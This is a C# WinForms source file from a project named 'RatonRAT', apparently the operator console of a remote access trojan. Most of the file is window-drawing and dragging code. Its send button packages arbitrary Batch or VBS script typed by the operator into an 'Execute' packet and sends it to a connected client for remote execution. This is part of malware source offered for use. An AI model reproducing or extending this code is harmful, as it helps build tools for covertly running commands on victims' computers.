using Server.Connection;
using Stuff;
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;

namespace RatonRAT.ClientForms
{
    public partial class FormExecute : Form
    {
        public SillyClient SillyClient { get; set; }

        private bool isMouseDown = false;

        private Point mouseOffset;

        private void Form_MouseDown(object sender, MouseEventArgs e)
        {
            isMouseDown = true;
            mouseOffset = new Point(e.X, e.Y);
        }

        private void Form_MouseMove(object sender, MouseEventArgs e)
        {
            if (isMouseDown)
            {
                this.Location = new Point(this.Left + e.X - mouseOffset.X, this.Top + e.Y - mouseOffset.Y);
            }
        }

        private void Form_MouseUp(object sender, MouseEventArgs e)
        {
            isMouseDown = false;
        }
        public FormExecute()
        {
            InitializeComponent();
            this.MouseDown += Form_MouseDown;
            this.MouseMove += Form_MouseMove;
            this.MouseUp += Form_MouseUp;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (SillyClient == null || !SillyClient.isConnected())
            {
                this.Close();
            }
        }

        private void FormExecute_Load(object sender, EventArgs e)
        {
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
            this.Paint += Form_Paint;
            comboBox1.Items.Clear();
            comboBox1.Items.Add("Batch");
            comboBox1.Items.Add("VBS");
            comboBox1.SelectedIndex = 0;
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void Form_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3))
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 25));
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string code = textBox1.Text.Replace("\r\n", "\n"); Pack pack = new Pack();
            pack.Set("Packet", "Execute");
            pack.Set("Type", comboBox1.SelectedItem.ToString());
            pack.Set("Code", code);
            SillyClient.Send(pack.Pacc());
            MessageBox.Show("Code sent successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
